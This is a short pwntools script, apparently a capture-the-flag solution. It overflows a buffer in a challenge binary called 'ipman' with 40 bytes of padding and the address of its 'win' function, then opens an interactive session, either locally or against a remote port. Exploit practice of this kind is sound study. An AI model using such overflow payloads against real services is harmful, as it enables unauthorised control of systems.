from pwn import *

local = True
elf = ELF('./ipman')

if local:
    io = elf.process()
else:
    io = remote('', 9994)

#pause()

pld = b""
pld += b"A" * 40
pld += p64(elf.sym['win'])
io.sendline(pld)

io.interactive()
